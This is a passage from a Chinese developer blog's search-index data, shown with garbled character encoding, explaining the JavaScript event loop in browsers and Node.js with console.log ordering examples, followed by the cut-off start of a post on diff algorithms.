ç«Ÿç„¶ç­”å¯¹äº†ã€‚é‚£ä½ æ›´è¦æ¥ç€å¾€ä¸‹çœ‹ï¼Œåé¢è¿˜æœ‰å¥½çœ‹çš„å½©è›‹å“¦~\näºŒã€æµè§ˆå™¨ä¸­çš„äº‹ä»¶å¾ªç¯ 1.åŒæ­¥å’Œå¼‚æ­¥ é¦–å…ˆé€šè¿‡ä¸€å¼ å¯¼å›¾æ¥çœ‹ä¸€ä¸‹javascriptäº‹ä»¶å¾ªç¯ä¸­ï¼ŒåŒæ­¥å’Œå¼‚æ­¥çš„å…³ç³»ï¼š\nåŒæ­¥å’Œå¼‚æ­¥ä»»åŠ¡åˆ†åˆ«è¿›å…¥ä¸åŒçš„æ‰§è¡Œ processï¼ŒåŒæ­¥çš„è¿›å…¥ä¸»çº¿ç¨‹ï¼Œå¼‚æ­¥çš„è¿›å…¥Event Tableå¹¶æ³¨å†Œå‡½æ•°ã€‚ å½“æŒ‡å®šçš„äº‹æƒ…å®Œæˆæ—¶ï¼ŒEvent Tableä¼šå°†è¿™ä¸ªå‡½æ•°ç§»å…¥Event Queueã€‚ ä¸»çº¿ç¨‹å†…çš„ä»»åŠ¡æ‰§è¡Œå®Œæ¯•ä¸ºç©ºï¼Œä¼šå»Event Queueè¯»å–å¯¹åº”çš„å‡½æ•°ï¼Œè¿›å…¥ä¸»çº¿ç¨‹æ‰§è¡Œã€‚ ä¸Šè¿°è¿‡ç¨‹ä¼šä¸æ–­é‡å¤ï¼Œä¹Ÿå°±æ˜¯å¸¸è¯´çš„Event Loop(äº‹ä»¶å¾ªç¯) é‚£ä¹ˆè¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼š\né‚£æ€ä¹ˆçŸ¥é“ä¸»çº¿ç¨‹æ‰§è¡Œæ ˆä¸ºç©ºå•Šï¼Ÿjså¼•æ“å­˜åœ¨monitoring processè¿›ç¨‹ï¼Œä¼šæŒç»­ä¸æ–­çš„æ£€æŸ¥ä¸»çº¿ç¨‹æ‰§è¡Œæ ˆæ˜¯å¦ä¸ºç©ºï¼Œä¸€æ—¦ä¸ºç©ºï¼Œå°±ä¼šå»Event Queueé‚£é‡Œæ£€æŸ¥æ˜¯å¦æœ‰ç­‰å¾…è¢«è°ƒç”¨çš„å‡½æ•°\n2.å®ä»»åŠ¡å’Œå¾®ä»»åŠ¡ã€äº‹ä»¶å¾ªç¯æ‰§è¡Œæœºåˆ¶ ç„¶è€Œï¼Œä»…ä»…ç†è§£åˆ°æ­¤ï¼Œå½“ç„¶æ˜¯è¿˜ä¸å¤Ÿçš„ï¼š é™¤äº†å¹¿ä¹‰çš„åŒæ­¥ä»»åŠ¡å’Œå¼‚æ­¥ä»»åŠ¡ï¼Œæˆ‘ä»¬å¯¹ä»»åŠ¡æœ‰æ›´ç²¾ç»†çš„å®šä¹‰ï¼šå®ä»»åŠ¡å’Œå¾®ä»»åŠ¡\näº‹ä»¶å¾ªç¯ï¼Œå®ä»»åŠ¡ï¼Œå¾®ä»»åŠ¡çš„å…³ç³»å¦‚å›¾æ‰€ç¤ºï¼š\näº‹ä»¶å¾ªç¯çš„é¡ºåºï¼Œå†³å®šjsä»£ç çš„æ‰§è¡Œé¡ºåºã€‚è¿›å…¥æ•´ä½“ä»£ç (å®ä»»åŠ¡)åï¼Œå¼€å§‹ç¬¬ä¸€æ¬¡å¾ªç¯ã€‚æ¥ç€æ‰§è¡Œæ‰€æœ‰çš„å¾®ä»»åŠ¡ã€‚ç„¶åå†æ¬¡ä»å®ä»»åŠ¡å¼€å§‹ï¼Œæ‰¾åˆ°å…¶ä¸­ä¸€ä¸ªä»»åŠ¡é˜Ÿåˆ—æ‰§è¡Œå®Œæ¯•ï¼Œå†æ‰§è¡Œæ‰€æœ‰çš„å¾®ä»»åŠ¡\nå›åˆ°æˆ‘ä»¬ä¸Šé¢è¯´çš„å®ä¾‹ä»£ç :\nconsole.log(1); setTimeout(function() { console.log(2); }, 0); new Promise(function(resolve) { console.log(3); resolve(Date.now()); }).then(function() { console.log(4); }); console.log(5); setTimeout(function() { new Promise(function(resolve) { console.log(6); resolve(Date.now()); }).then(function() { console.log(7); }); }, 0); æ‰§è¡Œæ­¥éª¤å¦‚ä¸‹ï¼š\næ‰§è¡Œ log(1)ï¼Œè¾“å‡º 1ï¼› é‡åˆ° setTimeoutï¼Œå°†å›è°ƒçš„ä»£ç  log(2)æ·»åŠ åˆ°å®ä»»åŠ¡ä¸­ç­‰å¾…æ‰§è¡Œï¼› æ‰§è¡Œ console.log(3)ï¼Œå°† then ä¸­çš„ log(4)æ·»åŠ åˆ°å¾®ä»»åŠ¡ä¸­ï¼› æ‰§è¡Œ log(5)ï¼Œè¾“å‡º 5ï¼› é‡åˆ° setTimeoutï¼Œå°†å›è°ƒçš„ä»£ç  log(6, 7)æ·»åŠ åˆ°å®ä»»åŠ¡ä¸­ï¼› å®ä»»åŠ¡çš„ä¸€ä¸ªä»»åŠ¡æ‰§è¡Œå®Œæ¯•ï¼ŒæŸ¥çœ‹å¾®ä»»åŠ¡é˜Ÿåˆ—ä¸­æ˜¯å¦å­˜åœ¨ä»»åŠ¡ï¼Œå­˜åœ¨ä¸€ä¸ªå¾®ä»»åŠ¡ log(4)ï¼ˆåœ¨æ­¥éª¤ 3 ä¸­æ·»åŠ çš„ï¼‰ï¼Œæ‰§è¡Œè¾“å‡º 4ï¼› å–å‡ºä¸‹ä¸€ä¸ªå®ä»»åŠ¡ log(2)æ‰§è¡Œï¼Œè¾“å‡º 2ï¼› å®ä»»åŠ¡çš„ä¸€ä¸ªä»»åŠ¡æ‰§è¡Œå®Œæ¯•ï¼ŒæŸ¥çœ‹å¾®ä»»åŠ¡é˜Ÿåˆ—ä¸­æ˜¯å¦å­˜åœ¨ä»»åŠ¡ï¼Œä¸å­˜åœ¨ï¼› å–å‡ºä¸‹ä¸€ä¸ªå®ä»»åŠ¡æ‰§è¡Œï¼Œæ‰§è¡Œ log(6)ï¼Œå°† then ä¸­çš„ log(7)æ·»åŠ åˆ°å¾®ä»»åŠ¡ä¸­ï¼› å®ä»»åŠ¡æ‰§è¡Œå®Œæ¯•ï¼Œå­˜åœ¨ä¸€ä¸ªå¾®ä»»åŠ¡ log(7)ï¼ˆåœ¨æ­¥éª¤ 9 ä¸­æ·»åŠ çš„ï¼‰ï¼Œæ‰§è¡Œè¾“å‡º 7ï¼› å› æ­¤ï¼Œæœ€ç»ˆçš„è¾“å‡ºé¡ºåºä¸ºï¼š1, 3, 5, 4, 2, 6, 7;\nå½“ç„¶ï¼Œä½ å¯ä»¥åœ¨Promise.thenå®ç°ä¸€ä¸ªç¨å¾®è€—æ—¶çš„æ“ä½œ(æ¯”å¦‚ 1~1000çš„forå¾ªç¯)ï¼Œè¿™ä¸ªæ­¥éª¤çœ‹èµ·æ¥ä¼šæ›´åŠ åœ°æ˜æ˜¾ã€‚é©¬ä¸Šä¼šè¾“å‡º1ï¼Œç¨ç­‰ä¸€ä¼šå„¿æ‰ä¼šè¾“å‡º3ï¼Œç„¶åå†è¾“å‡º2ã€‚ä¸è®ºç­‰å¾…å¤šé•¿æ—¶é—´è¾“å‡º3ï¼Œ2ä¸€å®šä¼šåœ¨3çš„åé¢è¾“å‡ºã€‚è¿™ä¹Ÿå°±å°è¯äº†eventloopä¸­çš„ç¬¬3æ­¥æ“ä½œï¼Œå¿…é¡»ç­‰æ‰€æœ‰çš„å¾®ä»»åŠ¡æ‰§è¡Œå®Œæ¯•åï¼Œæ‰å¼€å§‹ä¸‹ä¸€ä¸ªå®ä»»åŠ¡\n3.å®ä»»åŠ¡ã€å¾®ä»»åŠ¡æ¦‚å¿µåŠå…¶å¸¸è§çš„ä»»åŠ¡ç±»å‹ 3.1 å®ä»»åŠ¡ è¿›å…¥ä»»åŠ¡æ ˆç­‰å¾…ä¸»çº¿ç¨‹æ‰§è¡Œçš„ä¸»ä»£ç å—ï¼ŒåŒ…æ‹¬ä»å¼‚æ­¥é˜Ÿåˆ—é‡ŒåŠ å…¥åˆ°æ ˆçš„ï¼Œå¦‚setTimeout()ã€setIntervalï¼ˆï¼‰çš„å›è°ƒï¼Œå…¶ä¸­ä¸å«å¼‚æ­¥é˜Ÿåˆ—ä¸­çš„å¾®ä»»åŠ¡å¦‚Promise.thenå›è°ƒ\næ™®é€šæ¶ˆæ¯é˜Ÿåˆ—å’Œå»¶è¿Ÿé˜Ÿåˆ—ä¸­çš„ä»»åŠ¡ã€‚æ¸²æŸ“ä¸»çº¿ç¨‹é‡‡ç”¨ä¸€ä¸ªforå¾ªç¯ï¼Œä¸æ–­åœ°ä»è¿™äº›ä»»åŠ¡é˜Ÿåˆ—ä¸­å–å‡ºä»»åŠ¡å¹¶æ‰§è¡Œä»»åŠ¡ æ¯ä¸ªå®ä»»åŠ¡éƒ½å…³è”äº†ä¸€ä¸ªå¾®ä»»åŠ¡é˜Ÿåˆ— å®ä»»åŠ¡çš„æ—¶é—´ç²’åº¦æ¯”è¾ƒå¤§ï¼Œæ‰§è¡Œçš„æ—¶é—´é—´éš”ä¸èƒ½ç²¾ç¡®æ§åˆ¶ï¼Œå¯¹ä¸€äº›é«˜å®æ—¶æ€§çš„éœ€æ±‚å°±ä¸å¤ªç¬¦åˆï¼Œæ¯”å¦‚ç›‘å¬DOMå˜åŒ– macro-task(å®ä»»åŠ¡)å¸¸è§ç±»å‹ï¼š\nå®¿ä¸»ç¯å¢ƒ(å³æ•´ä½“ä»£ç scriptè„šæœ¬)ï¼Œä½œä¸ºjsè¿è¡Œçš„è½½ä½“ï¼Œå¸¸è§çš„æœ‰æµè§ˆå™¨ã€node.jsç­‰ setTimeoutã€setInterval setImmediate(node.js) æ¸²æŸ“ä»»åŠ¡ï¼ˆå¦‚è§£æDOMã€è®¡ç®—å¸ƒå±€ã€ç»˜åˆ¶ï¼‰ã€ç”¨æˆ¶äº¤äº’äº‹ä»¶(å¦‚é¼ æ ‡ç‚¹å‡»ã€æ»šåŠ¨â»šé¢ã€æ”¾å¤§ç¼©å°ç­‰) JavaScriptè„šæœ¬æ‰§è¡Œäº‹ä»¶ IOæ“ä½œï¼ˆç½‘ç»œè¯·æ±‚ã€æ–‡ä»¶è¯»å†™ï¼‰ 3.2 å¾®ä»»åŠ¡ å¾®ä»»åŠ¡: ä¸€ä¸ªéœ€è¦å¼‚æ­¥æ‰§è¡Œçš„å‡½æ•°\næ‰§è¡Œæ—¶æœºæ˜¯åœ¨ä¸»å‡½æ•°æ‰§è¡Œç»“æŸä¹‹åã€å½“å‰å®ä»»åŠ¡ç»“æŸä¹‹å‰åŠå½“å‰äº‹ä»¶å¾ªç¯ç»“æŸä¹‹å‰ å¾®ä»»åŠ¡é˜Ÿåˆ—ä¸æ¯ä¸€ä¸ªå®ä»»åŠ¡å…³è” åœ¨æ‰§è¡Œå¾®ä»»åŠ¡è¿‡ç¨‹ä¸­äº§ç”Ÿçš„æ–°çš„å¾®ä»»åŠ¡å¹¶ä¸ä¼šæ¨è¿Ÿåˆ°ä¸‹ä¸ªå®ä»»åŠ¡ä¸­æ‰§è¡Œï¼Œè€Œæ˜¯åœ¨å½“å‰çš„å®ä»»åŠ¡ä¸­ç»§ç»­æ‰§è¡Œ\nå¸¸è§ç±»å‹ï¼š\nPromise.resolve() MutationObserver(web) æµè§ˆå™¨ç›‘å¬DOMå˜åŒ– process.nextTick(node.js) queueMicrotask() Async/Await(å®é™…å°±æ˜¯promise) MutationObserveré‡‡ç”¨äº†â€œå¼‚æ­¥+å¾®ä»»åŠ¡â€çš„ç­–ç•¥:\nå¼‚æ­¥æ“ä½œè§£å†³äº†åŒæ­¥æ“ä½œçš„æ€§èƒ½é—®é¢˜:æ¯æ¬¡DOMèŠ‚ç‚¹å‘ç”Ÿå˜åŒ–çš„æ—¶å€™ï¼Œæ¸²æŸ“å¼•æ“å°†å˜åŒ–è®°å½•å°è£…æˆå¾®ä»»åŠ¡ï¼Œå¹¶ å°†å¾®ä»»åŠ¡æ·»åŠ è¿›å½“å‰çš„å¾®ä»»åŠ¡é˜Ÿåˆ—ä¸­ å¾®ä»»åŠ¡è§£å†³äº†å®æ—¶æ€§çš„é—®é¢˜: å½“æ‰§è¡Œåˆ°æ£€æŸ¥ç‚¹çš„æ—¶å€™ï¼ŒV8å¼•æ“å°±ä¼šæŒ‰ç…§é¡ºåºæ‰§è¡Œå¾®ä»»åŠ¡ ç›‘å¬DOMå˜åŒ–æŠ€æœ¯æ–¹æ¡ˆçš„æ¼”åŒ–å²ï¼šä»è½®è¯¢åˆ°Mutation Eventå†åˆ°æœ€æ–°ä½¿ç”¨çš„ MutationObserver\n3.3 requestAnimationFrame(web) ä¹Ÿå±äºå¼‚æ­¥æ‰§è¡Œçš„æ–¹æ³•ï¼Œä½†è¯¥æ–¹æ³•æ—¢ä¸å±äºå®ä»»åŠ¡ï¼Œä¹Ÿä¸å±äºå¾®ä»»åŠ¡, å…·ä½“å‚è€ƒMDNä¸­çš„å®šä¹‰\nå‘Šè¯‰æµè§ˆå™¨â€”â€”ä½ æƒ³åœ¨æµè§ˆå™¨ä¸‹æ¬¡é‡ç»˜ä¹‹å‰ç»§ç»­æ›´æ–°ä¸‹ä¸€å¸§åŠ¨ç”»\nä¸‰ã€node ä¸­çš„äº‹ä»¶å¾ªç¯ node 11åï¼Œäº‹ä»¶å¾ªç¯çš„ä¸€äº›åŸç†å‘ç”Ÿå˜åŒ–ï¼Œè¿™é‡Œä»¥æ–°çš„æ ‡å‡†ä¸ºä¸»ï¼Œå†åŠ ä¸Šå˜åŒ–ç‚¹è¿›è¡Œæ¯”å¯¹ã€‚\näº‹ä»¶å¾ªç¯æ˜¯nodeå¤„ç†ã€éé˜»å¡I/O æ“ä½œã€çš„æœºåˆ¶ï¼Œä¾é libuvå¼•æ“å®ç°ã€‚\n1.å¸¸è§çš„å®ä»»åŠ¡å’Œå¾®ä»»åŠ¡ macro-taskå¤§æ¦‚åŒ…æ‹¬ï¼š\nsetTimeout setInterval setImmediate scriptï¼ˆæ•´ä½“ä»£ç ) I/O æ“ä½œ \u0026hellip; micro-task å¤§æ¦‚åŒ…æ‹¬ï¼š\nprocess.nextTick(ä¸æ™®é€šå¾®ä»»åŠ¡æœ‰åŒºåˆ«ï¼Œåœ¨å¾®ä»»åŠ¡é˜Ÿåˆ—æ‰§è¡Œä¹‹å‰æ‰§è¡Œ) new Promise().then(å›è°ƒ)ç­‰ 2.nodeäº‹ä»¶å¾ªç¯æ•´ä½“ç†è§£å’Œé˜¶æ®µæ¦‚è¿° 2.1 æ•´ä½“ç†è§£ æ³¨æ„ï¼šæ¯ä¸ªæ¡†è¢«ç§°ä¸ºäº‹ä»¶å¾ªç¯æœºåˆ¶çš„ä¸€ä¸ªé˜¶æ®µã€‚\næ¯ä¸ªé˜¶æ®µéƒ½æœ‰ä¸€ä¸ª FIFOé˜Ÿåˆ—æ¥æ‰§è¡Œå›è°ƒã€‚ æ¯ä¸ªé˜¶æ®µéƒ½æ˜¯ç‰¹æ®Šçš„ï¼Œä½†é€šå¸¸ï¼Œå½“äº‹ä»¶å¾ªç¯è¿›å…¥ç»™å®šçš„é˜¶æ®µæ—¶ï¼Œå®ƒå°†æ‰§è¡Œç‰¹å®šäºè¯¥é˜¶æ®µçš„ä»»ä½•æ“ä½œï¼Œç„¶åæ‰§è¡Œè¯¥é˜¶æ®µé˜Ÿåˆ—ä¸­çš„å›è°ƒï¼Œç›´åˆ°é˜Ÿåˆ—ç”¨å°½æˆ–æœ€å¤§å›è°ƒæ•°å·²æ‰§è¡Œã€‚ å½“è¯¥é˜Ÿåˆ—å·²ç”¨å°½æˆ–è¾¾åˆ°å›è°ƒé™åˆ¶ï¼Œäº‹ä»¶å¾ªç¯å°†ç§»åŠ¨åˆ°ä¸‹ä¸€é˜¶æ®µ å› æ­¤ï¼Œå¯åˆ†æå‡ºnodeçš„äº‹ä»¶å¾ªç¯çš„é˜¶æ®µé¡ºåºä¸ºï¼š\nè¾“å…¥æ•°æ®é˜¶æ®µ(incoming data) è½®è¯¢é˜¶æ®µ(poll) æ£€æŸ¥é˜¶æ®µ(check) å…³é—­äº‹ä»¶å›è°ƒé˜¶æ®µ(close callback) å®šæ—¶å™¨æ£€æµ‹é˜¶æ®µ(timers) I/Oäº‹ä»¶å›è°ƒé˜¶æ®µ(I/O callbacks) é—²ç½®é˜¶æ®µ(idle, prepare)-\u0026gt;å›åˆ°ç¬¬2æ­¥ç»§ç»­æ–°ä¸€è½®ã€è½®è¯¢é˜¶æ®µã€\u0026hellip; 2.2 é˜¶æ®µæ¦‚è¿° å®šæ—¶å™¨æ£€æµ‹é˜¶æ®µ(timers)ï¼šæœ¬é˜¶æ®µæ‰§è¡Œ timer çš„å›è°ƒï¼Œå³ setTimeoutã€setInterval é‡Œé¢çš„å›è°ƒå‡½æ•°ã€‚ å¾…å®šå›è°ƒï¼šI/Oäº‹ä»¶å›è°ƒé˜¶æ®µ(I/O callbacks)ï¼Œæ‰§è¡Œå»¶è¿Ÿåˆ°ä¸‹ä¸€ä¸ªå¾ªç¯è¿­ä»£çš„ I/O å›è°ƒï¼Œå³ä¸Šä¸€è½®å¾ªç¯ä¸­æœªè¢«æ‰§è¡Œçš„ä¸€äº›I/Oå›è°ƒã€‚ é—²ç½®é˜¶æ®µ(idle, prepare)ï¼šä»…ç³»ç»Ÿå†…éƒ¨ä½¿ç”¨ã€‚ è½®è¯¢é˜¶æ®µ(poll)ï¼šæ£€ç´¢æ–°çš„ I/O äº‹ä»¶;æ‰§è¡Œä¸ I/O ç›¸å…³çš„å›è°ƒï¼ˆå‡ ä¹æ‰€æœ‰æƒ…å†µä¸‹ï¼Œé™¤äº†å…³é—­çš„å›è°ƒå‡½æ•°ï¼Œé‚£äº›ç”±è®¡æ—¶å™¨å’Œ setImmediate() è°ƒåº¦çš„ä¹‹å¤–ï¼‰ï¼Œå…¶ä½™æƒ…å†µ node å°†åœ¨é€‚å½“çš„æ—¶å€™åœ¨æ­¤é˜»å¡ã€‚ æ£€æŸ¥é˜¶æ®µ(check)ï¼šsetImmediate() å›è°ƒå‡½æ•°åœ¨è¿™é‡Œæ‰§è¡Œ å…³é—­äº‹ä»¶å›è°ƒé˜¶æ®µ(close callback)ï¼šä¸€äº›å…³é—­çš„å›è°ƒå‡½æ•°ï¼Œå¦‚ï¼šsocket.on(\u0026lsquo;close\u0026rsquo;, \u0026hellip;)ã€‚ 2.3 ä¸‰å¤§é‡ç‚¹é˜¶æ®µ å¼€å‘ä¸­çš„ç»å¤§éƒ¨åˆ†å¼‚æ­¥ä»»åŠ¡éƒ½æ˜¯åœ¨ pollã€checkã€timers è¿™3ä¸ªé˜¶æ®µå¤„ç†çš„\ntimers poll check timers é˜¶æ®µä¼šæ‰§è¡Œ setTimeout å’Œ setInterval å›è°ƒï¼Œå¹¶ä¸”æ˜¯ç”± poll é˜¶æ®µæ§åˆ¶çš„ã€‚åŒæ ·ï¼Œåœ¨ Nodeä¸­å®šæ—¶å™¨æŒ‡å®šçš„æ—¶é—´ä¹Ÿä¸æ˜¯å‡†ç¡®æ—¶é—´ï¼Œåªèƒ½æ˜¯å°½å¿«æ‰§è¡Œã€‚\npollé˜¶æ®µæ‰§è¡Œé€»è¾‘æµç¨‹å¦‚ä¸‹ï¼š\nå¦‚æœå½“å‰å·²ç»å­˜åœ¨å®šæ—¶å™¨ï¼Œè€Œä¸”æœ‰å®šæ—¶å™¨åˆ°æ—¶é—´äº†ï¼Œæ‹¿å‡ºæ¥æ‰§è¡Œï¼ŒeventLoop å°†å›åˆ° timers é˜¶æ®µã€‚ å¦‚æœæ²¡æœ‰å®šæ—¶å™¨, ä¼šå»çœ‹å›è°ƒå‡½æ•°é˜Ÿåˆ— å¦‚æœ poll é˜Ÿåˆ—ä¸ä¸ºç©ºï¼Œä¼šéå†å›è°ƒé˜Ÿåˆ—å¹¶åŒæ­¥æ‰§è¡Œï¼Œç›´åˆ°é˜Ÿåˆ—ä¸ºç©ºæˆ–è€…è¾¾åˆ°ç³»ç»Ÿé™åˆ¶ å¦‚æœ poll é˜Ÿåˆ—ä¸ºç©ºæ—¶ï¼Œä¼šæœ‰ä¸¤ä»¶äº‹å‘ç”Ÿ å¦‚æœæœ‰ setImmediate å›è°ƒéœ€è¦æ‰§è¡Œï¼Œpoll é˜¶æ®µä¼šåœæ­¢å¹¶ä¸”è¿›å…¥åˆ° check é˜¶æ®µæ‰§è¡Œå›è°ƒ å¦‚æœæ²¡æœ‰ setImmediate å›è°ƒéœ€è¦æ‰§è¡Œï¼Œä¼šç­‰å¾…å›è°ƒè¢«åŠ å…¥åˆ°é˜Ÿåˆ—ä¸­å¹¶ç«‹å³æ‰§è¡Œå›è°ƒï¼Œè¿™é‡ŒåŒæ ·ä¼šæœ‰ä¸ªè¶…æ—¶æ—¶é—´è®¾ç½®é˜²æ­¢ä¸€ç›´ç­‰å¾…ä¸‹å»,ä¸€æ®µæ—¶é—´åè‡ªåŠ¨è¿›å…¥ check é˜¶æ®µã€‚ check é˜¶æ®µã€‚è¿™æ˜¯ä¸€ä¸ªæ¯”è¾ƒç®€å•çš„é˜¶æ®µï¼Œç›´æ¥æ‰§è¡Œ setImmdiate çš„å›è°ƒ\n3.process.nextTick process.nextTick æ˜¯ä¸€ä¸ªç‹¬ç«‹äº eventLoop çš„ä»»åŠ¡é˜Ÿåˆ—\næ¯ä¸€ä¸ªã€eventLoopé˜¶æ®µã€å®Œæˆåä¼šå»æ£€æŸ¥nextTick é˜Ÿåˆ—ï¼Œå¦‚æœé‡Œé¢æœ‰ä»»åŠ¡ï¼Œä¼šè®©è¿™éƒ¨åˆ†ä»»åŠ¡ä¼˜å…ˆäºå¾®ä»»åŠ¡æ‰§è¡Œ\nçœ‹ä¸€ä¸ªä¾‹å­ï¼š\nsetImmediate(() =\u0026gt; { console.log(\u0026#39;timeout1\u0026#39;) Promise.resolve().then(() =\u0026gt;console.log(\u0026#39;promise resolve\u0026#39;)) process.nextTick(() =\u0026gt;console.log(\u0026#39;next tick1\u0026#39;)) }); setImmediate(() =\u0026gt; { console.log(\u0026#39;timeout2\u0026#39;) process.nextTick(() =\u0026gt;console.log(\u0026#39;next tick2\u0026#39;)) }); setImmediate(() =\u0026gt;console.log(\u0026#39;timeout3\u0026#39;)); setImmediate(() =\u0026gt;console.log(\u0026#39;timeout4\u0026#39;)); node11å‰ï¼Œæ¯ä¸€ä¸ªeventLoopé˜¶æ®µåå»æ£€æŸ¥nextTické˜Ÿåˆ— nextTické˜Ÿåˆ—æœ‰ä»»åŠ¡ï¼Œä¼šä¼˜å…ˆäºå¾®ä»»åŠ¡æ‰§è¡Œã€‚å³ä»¥ä¸Šä»£ç è¿›å…¥checké˜¶æ®µï¼Œæ‰§è¡Œã€æ‰€æœ‰setImmediateã€ï¼Œå®Œæˆåæ‰§è¡ŒnextTické˜Ÿåˆ—ï¼Œæœ€åæ‰§è¡Œå¾®ä»»åŠ¡é˜Ÿåˆ—ï¼Œè¾“å‡ºä¸ºï¼štimeout1=\u0026gt;timeout2=\u0026gt;timeout3=\u0026gt;timeout4=\u0026gt;next tick1=\u0026gt;next tick2=\u0026gt;promise resolve node11åï¼Œprocess.nextTickæ˜¯å¾®ä»»åŠ¡çš„ä¸€ç§ã€‚ å³ä»£ç è¿›å…¥check é˜¶æ®µï¼Œæ‰§è¡Œã€ä¸€ä¸ªsetImmediateå®ä»»åŠ¡ã€ï¼Œç„¶åæ‰§è¡Œã€å…¶å¾®ä»»åŠ¡é˜Ÿåˆ—ã€ï¼Œå†æ‰§è¡Œã€ä¸‹ä¸€ä¸ªå®ä»»åŠ¡åŠå…¶å¾®ä»»åŠ¡ã€,å› æ­¤è¾“å‡ºä¸ºtimeout1=\u0026gt;next tick1=\u0026gt;promise resolve=\u0026gt;timeout2=\u0026gt;next tick2=\u0026gt;timeout3=\u0026gt;timeout4 4.node ç‰ˆæœ¬å·®å¼‚ \u0026amp; å’Œæµè§ˆå™¨eventLoopçš„å·®å¼‚ node ç‰ˆæœ¬å·®å¼‚ï¼š\nnode11åä¸€äº›ç‰¹æ€§å‘æµè§ˆå™¨çœ‹é½ï¼Œæ€»çš„æ¥è¯´ï¼Œå¦‚æœnode11 ç‰ˆæœ¬ä¸€æ—¦æ‰§è¡Œä¸€ä¸ªé˜¶æ®µé‡Œçš„ä¸€ä¸ªå®ä»»åŠ¡(setTimeout,setIntervalå’ŒsetImmediate)ï¼Œå°±ç«‹åˆ»æ‰§è¡Œå¯¹åº”çš„å¾®ä»»åŠ¡é˜Ÿåˆ— node11åï¼Œprocess.nextTickæ˜¯å¾®ä»»åŠ¡çš„ä¸€ç§ï¼Œå…ˆè¿›å…¥checké˜¶æ®µæ‰§è¡Œï¼Œå†æ‰§è¡Œç›¸åº”çš„å¾®ä»»åŠ¡é˜Ÿåˆ—ã€‚ å’Œæµè§ˆå™¨eventLoopçš„å·®å¼‚ï¼š\næµè§ˆå™¨ä¸­çš„å¾®ä»»åŠ¡æ˜¯åœ¨æ¯ä¸ªç›¸åº”çš„å®ä»»åŠ¡ä¸­æ‰§è¡Œçš„ nodejsä¸­çš„å¾®ä»»åŠ¡æ˜¯åœ¨ä¸åŒé˜¶æ®µä¹‹é—´æ‰§è¡Œçš„ æ€»ç»“ javascriptæ˜¯ä¸€é—¨å•çº¿ç¨‹è¯­è¨€ Event Loopæ˜¯ javascriptçš„æ‰§è¡Œæœºåˆ¶ å‚è€ƒ Node.js äº‹ä»¶å¾ªç¯.å®˜æ–¹ è¯´è¯´äº‹ä»¶å¾ªç¯æœºåˆ¶.å‰ç«¯Q æµè§ˆå™¨ä¸Nodeçš„äº‹ä»¶å¾ªç¯(Event Loop)æœ‰ä½•åŒºåˆ«.æµªé‡Œè¡ŒèˆŸ ã€Šæµè§ˆå™¨å·¥ä½œåŸç†ä¸å®è·µã€‹.æå®¢æ—¶é—´.æå…µ æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯æ·»åŠ ä½œè€…å¾®ä¿¡ï¼\n","permalink":"https://lianpf.github.io/posts/computer-basics/chrome-event-loop/","summary":"ä¸€ã€èƒŒæ™¯ ä½œä¸ºä¸€æšâ€œå‰ç«¯æ‰“å­—å‘˜â€ï¼Œ æ— è®ºæ˜¯æ–°æ‰‹è¿˜æ˜¯è€é¸Ÿï¼Œéƒ½ä¼šé‡åˆ°","title":"JavaScript\u0026Node: äº‹ä»¶å¾ªç¯æœºåˆ¶ï¼ˆEvent Loopï¼‰"},{"content":"ä½ äº†è§£ä¼ ç»Ÿçš„diffç®—æ³•ä¹ˆï¼Ÿäº†è§£ react ä¼˜åŒ–çš„diffç®—æ³•ä¹ˆï¼Ÿäº†è§£ Vue2.xå’ŒVue3.x æ¸²æŸ“å™¨çš„diffç®—æ³•\u0026hellip;\nåœºæ™¯ è®¡ç®—ä¸¤é¢—æ ‘å½¢ç»“æ„å·®å¼‚å¹¶è¿›è¡Œè½¬æ¢\næ–‡ä¸­, æ‰€æåŠnå‡ä»£è¡¨èŠ‚ç‚¹çš„ä¸ªæ•°\nä¼ ç»ŸDiffç®—æ³• å¤„ç†æ–¹æ¡ˆ: å¾ªç¯é€’å½’æ¯ä¸€ä¸ªèŠ‚ç‚¹\nå¦‚ä¸Šæ‰€ç¤º, å·¦ä¾§æ ‘aèŠ‚ç‚¹ä¾æ¬¡è¿›è¡Œå¦‚ä¸‹å¯¹æ¯”:\na-\u0026gt;eã€a-\u0026gt;dã€a-\u0026gt;bã€a-\u0026gt;cã€a-\u0026gt;a\nä¹‹åå·¦ä¾§æ ‘å…¶å®ƒèŠ‚ç‚¹bã€cã€dã€eäº¦æ˜¯ä¸å³ä¾§æ ‘æ¯ä¸ªèŠ‚ç‚¹å¯¹æ¯”, ç®—æ³•å¤æ‚åº¦èƒ½è¾¾åˆ°O(n^2)\næŸ¥æ‰¾å®Œå·®å¼‚åè¿˜éœ€è®¡ç®—æœ€å°è½¬æ¢æ–¹å¼ï¼Œè¿™å…¶ä¸­çš„åŸç†æˆ‘æ²¡ä»”ç»†å»çœ‹ï¼Œæœ€ç»ˆè¾¾åˆ°çš„ç®—æ³•å¤æ‚åº¦æ˜¯O(n^3)\nå°†ä¸¤é¢—æ ‘ä¸­æ‰€æœ‰çš„èŠ‚ç‚¹ä¸€ä¸€å¯¹æ¯”éœ€è¦O(nÂ²)çš„å¤æ‚åº¦ï¼Œåœ¨å¯¹æ¯”è¿‡ç¨‹ä¸­å‘ç°æ—§èŠ‚ç‚¹åœ¨æ–°çš„æ ‘ä¸­æœªæ‰¾åˆ°ï¼Œé‚£ä¹ˆå°±éœ€è¦æŠŠæ—§èŠ‚ç‚¹åˆ é™¤ï¼Œåˆ é™¤ä¸€æ£µæ ‘çš„ä¸€ä¸ªèŠ‚ç‚¹(æ‰¾åˆ°ä¸€ä¸ªåˆé€‚çš„èŠ‚ç‚¹æ”¾åˆ°è¢«åˆ 